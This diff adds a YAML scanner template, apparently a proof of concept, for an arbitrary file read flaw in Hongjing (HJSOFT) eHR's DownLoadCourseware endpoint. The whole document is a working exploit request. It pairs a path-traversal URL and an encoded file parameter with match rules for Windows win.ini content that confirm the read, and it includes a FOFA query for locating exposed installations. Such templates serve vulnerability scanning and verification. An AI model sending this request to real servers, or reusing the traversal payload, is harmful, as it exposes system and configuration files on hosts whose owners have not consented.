@@ -1,0 +1,15 @@
+id: poc-yaml-hjsoft-ehr-downloadcourseware-anyfile-read
+info:
+  name: 宏景eHR DownLoadCourseware 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
+  expression: status_code == 200 && contains(body,"; for 16-bit app support") && contains(body,"[files]")
+    && contains(headers,"filename=") && !contains(body,"<")
+variables: {}
+transport: http
